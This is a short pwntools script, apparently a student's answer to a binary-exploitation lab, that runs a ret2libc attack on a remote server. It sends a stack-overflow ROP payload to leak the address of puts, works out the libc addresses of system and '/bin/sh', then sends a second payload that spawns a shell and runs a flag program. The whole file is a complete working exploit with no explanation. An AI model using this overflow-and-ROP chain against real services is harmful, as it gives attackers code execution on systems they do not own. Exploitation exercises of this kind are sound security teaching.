from pwn import *
context.arch = 'amd64'

sh = remote('47.99.80.189', 10012)
elf = ELF("./02_ret2libc64")

sh.recvuntil("Please input your StudentID:\n") # 远程环境统一要求输入学号    
sh.sendline('3180105507')
sh.recvuntil("[*] Now, please input your ID:\n")
sh.sendline('3180105507')
sh.recvuntil("Give me something to overflow me!\n")

libc= elf.libc
puts_got=elf.got["puts"]
puts_plt = elf.plt["puts"]
libc_puts = libc.symbols["puts"]

# leak addr
payload1 = b'A'*264 + p64(0x00400843) + p64(puts_got) + p64(puts_plt) + p64(0x00400706)
sh.sendline(payload1)

# get the related addr
puts_addr = sh.recvuntil("\n")[:-1]
puts_addr = u64((puts_addr).ljust(8, b'\x00'))

libc_base = puts_addr - libc_puts
system_addr = libc_base + libc.symbols["system"] 
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

# get shell
payload2 = b'A'*264 + p64(0x00400843) + p64(binsh_addr) + p64(0x0040053e) + p64(system_addr)
sh.sendline(payload2)

sh.sendline("./flag.exe 3180105507") 
sh.interactive()